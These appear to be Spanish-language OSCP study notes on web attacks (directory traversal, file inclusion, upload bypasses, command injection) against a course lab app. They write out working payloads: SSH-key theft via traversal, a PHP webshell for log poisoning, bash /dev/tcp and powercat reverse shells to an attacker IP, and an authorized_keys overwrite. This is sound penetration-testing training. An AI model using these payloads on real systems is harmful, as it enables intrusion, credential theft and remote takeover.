---
tipo: modulo
modulo: 9
estado: repasado
tags:
  - oscp
  - explotacion
  - web
  - linux
  - windows
fecha: 2026-09-28
---

# 09 - Common Web Application Attacks

> [!abstract] Resumen
> Cuatro ataques web comunes e **independientes del stack**: **Directory Traversal** (leer ficheros fuera del web root), **File Inclusion** (LFI/RFI + PHP wrappers → ejecución de código), **File Upload** (subir webshell ejecutable o abusar del upload + otra vuln como traversal) y **Command Injection** (inyectar comandos del SO). El hilo conductor es la app de laboratorio *Mountain Desserts / Mountain Vaults*. Objetivo final de casi todos: **RCE / reverse shell**.
> Ideas transversales: entender **paths absolutos vs relativos**, usar **URL encoding** (`%2e`, `%20`, `%3B`) para saltar filtros, y **no probar en el navegador** sino con curl/Burp.

## Conceptos clave
- **Path absoluto**: empieza en `/` (raíz), válido desde cualquier sitio. **Path relativo**: usa `../` para subir directorios; sobran `../` una vez llegas a `/` (útil si no sabes el cwd).
- **Web root**: base desde la que sirve el servidor (Linux: `/var/www/html/`). Directory traversal = escapar de ahí con `../`.
- **Directory Traversal vs File Inclusion**: traversal solo **lee** el contenido de un fichero; inclusion lo **incluye en el código en ejecución** → si tiene código ejecutable, **se ejecuta**.
- **LFI** (Local File Inclusion): incluye ficheros del propio servidor. **RFI** (Remote File Inclusion): incluye ficheros remotos (HTTP/SMB); requiere `allow_url_include=On` (off por defecto en PHP moderno).
- **Log Poisoning**: escribir código (ej. PHP en el `User-Agent`) en un log y luego incluir ese log vía LFI para ejecutarlo.
- **PHP wrappers**: `php://filter` (leer ficheros, con/ sin base64) y `data://` (ejecutar código embebido; requiere `allow_url_include`).
- **Webshell**: script pequeño que da una CLI web. Kali trae varios en `/usr/share/webshells/`.
- **Command Injection**: la app pasa input a un comando del SO sin sanear → encadenar comandos con `;`, `&&`, `&`.

> [!tip] Idea para el examen
> Ante un parámetro que apunta a un fichero (`?page=`, `?file=`, `?lang=`), prueba **siempre** traversal (`/etc/passwd`, Windows `C:\Windows\System32\drivers\etc\hosts`), y si "incluye" en vez de "leer", escala a **LFI→RCE** (log poisoning o wrappers). En uploads, prueba extensiones alternativas (`.pHP`, `.php7`, `.phtml`) o combinar con traversal para sobrescribir `authorized_keys`. En cualquier campo que "ejecute algo", prueba inyección con `;`/`&&` URL-encoded. Usa **curl/Burp**, nunca el navegador (reformatea la salida).

---

## 9.1 Directory Traversal

Leer ficheros **fuera del web root** por falta de saneado de input. Identificación: pasar el ratón por botones/enlaces, revisar parámetros y source. Un enlace revela mucho:

```
https://example.com/cms/login.php?language=en.html
```
- `login.php` → la app usa **PHP**.
- `language=en.html` → parámetro que carga un **fichero** (probar acceder directo a `en.html` y luego a otros ficheros).
- `cms/` → la app corre en un **subdirectorio** del web root.

### Explotación (Linux)
```bash
# parámetro "page" vulnerable -> leer /etc/passwd con path relativo
curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../etc/passwd"
# /etc/passwd revela home dirs -> robar clave SSH privada
curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa"
```
Guardar la clave en `dt_key`, ajustar permisos y conectar:
```bash
chmod 400 dt_key                                  # ssh exige que solo el owner lea la clave
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
```
| Parte | Qué hace |
|---|---|
| `../` | Sube un directorio (sobran de más al llegar a `/`) |
| `-i dt_key` | Clave privada a usar |
| `-p 2222` | Puerto SSH no estándar |

> [!warning] Usa **curl/Burp**, no el navegador: el browser reformatea/parsea la salida y puede romper la clave SSH. curl la devuelve limpia (aunque incluya el HTML de la página).

### Directory Traversal en Windows
- Fichero de prueba (legible por todos): `C:\Windows\System32\drivers\etc\hosts`.
- No hay equivalente directo a `/etc/passwd`+SSH → más difícil llegar a acceso. Investigar rutas según el servicio: IIS logs en `C:\inetpub\logs\LogFiles\W3SVC1\`, config en `C:\inetpub\wwwroot\web.config`.
- Probar **backslash** `..\` además de `../` (RFC 1738 dice slash, pero algunas apps Windows solo son vulnerables con `\`).

### Encoding para saltar filtros
`../` suele estar filtrado (servidor, WAF o app). Codificar los puntos con **URL encoding** (`.`=`%2e`):
```bash
# Apache 2.4.49 path traversal (CVE-2021-41773) — ../ filtrado, %2e funciona
curl "http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
> [!tip] Los filtros suelen buscar la versión en texto plano (`../`) pero no la codificada (`%2e%2e/`). Tras pasar el filtro, el servidor decodifica e interpreta la request. Detalle en [[Directory Traversal]].

---

## 9.2 File Inclusion (LFI / RFI)

A diferencia del traversal, la inclusion **ejecuta** el fichero incluido si tiene código. Con un `.php`: traversal muestra el **source**, inclusion lo **ejecuta**. Detalle en [[File Inclusion (LFI-RFI)]].

### LFI → RCE por Log Poisoning
Idea: escribir código PHP en un log que controlamos (ej. `User-Agent` en `access.log`) y luego **incluir el log** vía LFI para ejecutarlo.

```bash
# 1) ver qué se guarda en el log (el User-Agent aparece)
curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log"
```
2) Con Burp/Repeater, cambiar el **User-Agent** por el snippet PHP:
```php
<?php echo system($_GET['cmd']); ?>
```
3) Incluir el log y pasar el comando por `cmd` (delimitar params con `&`; quitar el User-Agent malicioso de la request para no re-envenenar):
```
page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
```
> [!warning] El espacio en el comando rompe la ejecución. Soluciones: **URL encoding** (`ls%20-la`) o usar **IFS**. Reverse shell: `system` puede lanzar `sh`, no Bash → envolver en `bash -c "..."`:
> ```bash
> bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
> ```
> URL-encoded en `cmd` y con `nc -nvlp 4444` a la escucha.

LFI en Windows: mismo snippet PHP (la función `system` es agnóstica); cambian las rutas de logs (XAMPP: `C:\xampp\apache\logs\`). También existe LFI en Perl, ASP/ASPX, JSP y Node.js (mismo concepto, distinto lenguaje del snippet).

### PHP wrappers
```bash
# php://filter -> LEER el source de un .php (sin ejecutarlo) en base64
curl "http://.../index.php?page=php://filter/convert.base64-encode/resource=admin.php"
echo "PCFE...K" | base64 -d      # decodificar -> revela credenciales MySQL, etc.

# data:// -> EJECUTAR código embebido (requiere allow_url_include=On)
curl "http://.../index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64        # para saltar filtros de "system"
curl "http://.../index.php?page=data://text/plain;base64,PD9waHA...Pg==&cmd=ls"
```
| Wrapper | Uso |
|---|---|
| `php://filter/convert.base64-encode/resource=` | Leer source (incluye ejecutables) en base64 |
| `data://text/plain,` | Ejecutar código PHP embebido (plaintext o `;base64,`) |

### RFI (Remote File Inclusion)
Menos común: requiere `allow_url_include=On`. Incluye un fichero **remoto** (HTTP/SMB) que se ejecuta en el contexto de la app.
```bash
# servir una webshell desde Kali
python3 -m http.server 80        # (en /usr/share/webshells/php/)
# incluirla remotamente y ejecutar comando
curl "http://.../index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

---

## 9.3 File Upload Vulnerabilities

Tres categorías: **(1)** subir fichero **ejecutable** (webshell); **(2)** upload **+ otra vuln** (traversal para sobrescribir `authorized_keys`, XXE/XSS en SVG...); **(3)** requiere **interacción** de usuario (macro en un `.docx`). Detalle en [[File Upload]].

### Subida de ejecutables (bypass de filtro)
Localizar el upload (avatar en CMS, sección de empleo, formularios). Probar primero un `.txt`, luego la webshell. Si bloquea `.php` (blacklist):
- Extensiones alternativas: **`.phps`, `.php7`, `.phtml`**.
- **Cambiar mayúsculas**: `.pHP` (si el filtro compara solo contra strings en minúscula).

```bash
# tras subir simple-backdoor.pHP a /uploads (bypass por mayúsculas), ejecutar
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir"
```
Reverse shell en Windows (XAMPP) con PowerShell base64:
```powershell
# en Kali (pwsh): codificar el one-liner en UTF-16LE + base64
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
[Convert]::ToBase64String($Bytes)
```
```bash
# ejecutar vía la webshell (powershell -enc <base64>), con nc -nvlp 4444 escuchando
curl "http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwA..."
```
Kali trae webshells en `/usr/share/webshells/` (asp, aspx, cfm, jsp, perl, php, laudanum). Otro bypass: subir `.txt` y **renombrar** a `.php` si la app lo permite.

### Subida de no-ejecutables (upload + traversal)
Si no puedes ejecutar lo subido, combina con **directory traversal** en el `filename` para **sobrescribir** ficheros sensibles. Ej.: sobrescribir el `authorized_keys` de root:
```bash
ssh-keygen                       # genera par de claves (ej. "fileup")
cat fileup.pub > authorized_keys # el authorized_keys contiene NUESTRA pública
```
Interceptar el upload en Burp y cambiar el `filename` a:
```
../../../../../../../root/.ssh/authorized_keys
```
```bash
rm ~/.ssh/known_hosts            # evitar error de host key si ya conectaste antes
ssh -p 2222 -i fileup root@mountaindesserts.local
```
> [!warning] Sobrescribir ficheros a ciegas en un pentest real puede **destruir datos** o tumbar producción. Muchas apps con web server propio corren como **root/Administrator** (sin estructura de privilegios) → merece la pena probar.

---

## 9.4 Command Injection

La app pasa input directamente a un comando del SO. Encadenar comandos con `;`, `&&` o `&` (CMD). Detalle en [[Command Injection]].

Caso *Mountain Vaults* (form que hace `git clone <url>`), parámetro `Archive`:
```bash
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive   # "Command Injection detected"
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive        # OK -> muestra ayuda de git
curl -X POST --data 'Archive=git version' http://...:8000/archive           # "git version 2.35.1.windows.2" -> Windows
# encadenar: el filtro exige "git" -> git%3Bipconfig (%3B = ;)
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
| Parte | Qué hace |
|---|---|
| `-X POST` | Fuerza método POST |
| `--data 'k=v'` | Cuerpo del POST |
| `%3B` `;` · `%26%26` `&&` · `&` | Delimitadores para encadenar comandos |

Detectar el intérprete (snippet de PetSerAl, imprime `CMD` o `PowerShell`):
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Reverse shell con **Powercat** (Netcat en PowerShell, incluido en Kali):
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80        # servir powercat
nc -nvlp 4444                    # listener
```
Comando inyectado (download cradle + powercat), URL-encoded en `Archive` (prefijado con `git;`):
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

---

## Ejemplo práctico
> [!example] Árbol de decisión web (RCE)
> 1. Parámetro tipo `?page=`/`?file=` → **traversal** (`/etc/passwd`, hosts en Windows). Filtrado `../` → probar `%2e%2e/` y `..\`.
> 2. ¿Incluye o solo lee? Si **incluye** → **LFI**: log poisoning (`User-Agent` con `<?php system($_GET['cmd'])?>`) o wrappers (`php://filter` para leer source, `data://` para ejecutar). `allow_url_include=On` → **RFI**.
> 3. **Upload** → subir webshell; si hay blacklist, `.pHP`/`.php7`/renombrar; si no ejecuta, upload + traversal para `authorized_keys`.
> 4. Campo que "ejecuta" (git, ping, conversores) → **command injection** con `;`/`&&` URL-encoded; detectar intérprete; reverse shell (bash `-c` en Linux, Powercat en Windows).

## Relacionado
- Técnicas: [[Directory Traversal]] · [[File Inclusion (LFI-RFI)]] · [[File Upload]] · [[Command Injection]]
- Cheatsheet: [[Web]] · [[Explotacion y Shells]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar el bypass del espacio con **IFS** en command injection/LFI (cuándo usarlo frente a `%20`).
> - Practicar traversal en Windows sin poder listar directorios: ¿qué ficheros probar según servicio (IIS, XAMPP)?
> - Confirmar en el lab si `data://` y RFI están habilitados (`allow_url_include`) — en PHP moderno vienen off.
